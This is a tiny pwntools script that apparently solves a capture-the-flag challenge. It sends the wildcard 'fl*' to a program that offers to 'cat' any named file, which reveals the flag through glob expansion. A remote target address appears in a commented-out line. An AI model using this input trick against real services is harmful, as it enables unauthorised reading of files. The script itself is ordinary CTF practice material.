from pwn import *

p = process("./main")
#p = remote("35.159.81.154", 1342)
p.recvuntil(b"Give me the name of a file and I will cat it")
p.sendline(b"fl*")
p.interactive()
